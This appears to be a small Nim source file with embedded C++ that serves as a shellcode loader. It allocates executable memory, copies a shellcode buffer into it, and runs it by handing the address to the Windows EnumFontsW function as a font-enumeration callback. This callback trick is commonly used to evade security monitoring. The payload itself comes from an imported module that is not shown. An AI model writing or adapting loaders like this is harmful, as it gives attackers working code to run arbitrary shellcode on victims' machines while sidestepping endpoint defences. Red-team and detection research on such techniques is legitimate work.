import public

{.emit: """

int EnumFontsWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    HDC dc = GetDC(NULL);
    EnumFontsW(dc, NULL, (FONTENUMPROCW)addr, NULL);
    return 0;
}
"""
.}

proc EnumFontsWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumFontsWNim(@)",nodecl.}

discard EnumFontsWNim(code,codelen)